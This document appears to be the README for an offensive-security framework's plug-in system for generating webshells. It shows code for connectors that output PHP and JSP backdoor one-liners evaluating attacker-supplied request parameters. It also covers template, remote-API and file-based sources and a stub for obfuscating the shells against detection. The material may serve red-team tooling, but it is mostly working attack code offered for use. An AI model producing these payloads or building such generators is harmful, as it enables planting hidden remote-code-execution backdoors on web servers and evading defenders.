# Custom Webshell Connectors

Drop custom connector files here - they're auto-discovered and registered.

## Quick Start

**1. Copy template:**
```bash
cp example_connector.py my_connector.py
```

**2. Implement connector:**
```python
from ofx.data.webshell.connectors.base import WebshellConnector

class MyToolConnector(WebshellConnector):
    def __init__(self):
        super().__init__(name="mytool", description="My tool wrapper")
    
    def generate(self, language, password="pass", encoder="default", **kwargs):
        # Your generation logic
        if language == 'php':
            return f"<?php eval($_POST['{password}']); ?>"
        raise ValueError(f"Unsupported language: {language}")
```

**3. Use it:**
```python
from ofx.api.webshell import generate_webshell

shell = generate_webshell('php', password='x', connector_name="mytool")
```

## Connector Patterns

### 1. Template-Based
```python
class CustomTemplateConnector(WebshellConnector):
    def __init__(self):
        super().__init__(name="custom-template", description="Custom templates")
        self.templates = {
            'php': '<?php eval($_POST["{{PASSWORD}}"]); ?>',
            'jsp': '<% eval(request.getParameter("{{PASSWORD}}")); %>',
        }
    
    def generate(self, language, password="pass", **kwargs):
        template = self.templates.get(language.lower())
        if not template:
            raise ValueError(f"No template for {language}")
        return template.replace('{{PASSWORD}}', password)
```

### 2. HTTP API Client
```python
from ofx.data.webshell.connectors.remote import RemoteHTTPConnector

http = RemoteHTTPConnector(
    base_url='https://webshell-api.example.com',
    api_key='your-api-key'
)

# Register for use
from ofx.api.webshell import get_registry
get_registry().register_connector_instance(http)

# Use it
shell = generate_webshell('php', password='x', connector_name=http.name)
```

### 3. File-Based
```python
from ofx.data.webshell.connectors.remote import FileConnector

file = FileConnector(template_dir='/opt/webshells')

# Templates: /opt/webshells/php.php, /opt/webshells/jsp_base64.jsp, etc.
get_registry().register_connector_instance(file)

shell = generate_webshell('php', password='x', connector_name=file.name)
```

### 4. Obfuscation/Encoding
```python
class ObfuscatorConnector(WebshellConnector):
    def generate(self, language, password="pass", encoder="default", **kwargs):
        # Generate base webshell
        base = f"<?php eval($_POST['{password}']); ?>"
        
        # Apply obfuscation
        obfuscated = self._obfuscate(base)
        return obfuscated
    
    def _obfuscate(self, code):
        # Variable name randomization
        # String encoding
        # Code structure mutation
        return code  # Implement your obfuscation
```

## API Reference

**Required Methods:**
- `__init__()` - Set name and description
- `generate(language, password, encoder, **kwargs)` - Generate webshell

**Optional Methods:**
- `_check_availability()` - Return True if dependencies met
- `get_supported_languages()` - Return list of languages
- `get_supported_encoders(language)` - Return list of encoders

**Parameters:**
```python
def generate(
    self,
    language: str,        # 'php', 'jsp', 'asp', 'aspx'
    password: str,        # Parameter name
    encoder: str,         # Encoding method
    secret_header: str,   # Optional auth header
    secret_value: str,    # Optional auth value
    inline: bool,         # Remove whitespace
    **kwargs              # Custom parameters
) -> str:
```

## Testing

```python
from ofx.api.webshell import get_connector, get_available_connectors

# Test specific connector
connector = get_connector('my-connector')
if connector and connector.is_available():
    shell = connector.generate('php', password='test')
    print(f"✓ Generated {len(shell)} bytes")
else:
    print("✗ Connector not available")

# List all available
for conn in get_available_connectors():
    print(f"{conn.name}: {conn.description}")
```

## Best Practices

1. **Validate inputs** - Check language, password, encoder
2. **Handle errors** - Raise `RuntimeError` or `ValueError` with clear messages
3. **Check availability** - Implement `_check_availability()` properly
4. **Document usage** - Add docstrings and examples
5. **Security** - Never log passwords or sensitive data

## Examples

See [example_connector.py](example_connector.py) for:
- Obfuscation connector
- Polymorphic generator
- Custom template system

## Troubleshooting

**Connector not found:**
- File must not start with `_` or be named `__init__.py`
- Class must inherit from `WebshellConnector`
- Check logs for loading errors

**Import errors:**
```python
from ofx.data.webshell.connectors.base import WebshellConnector
```

**Availability issues:**
- Implement `_check_availability()` to return `True`/`False`
- Check logs for dependency issues

---

⚠️ **Security:** Validate inputs, review third-party connectors, never commit credentials.
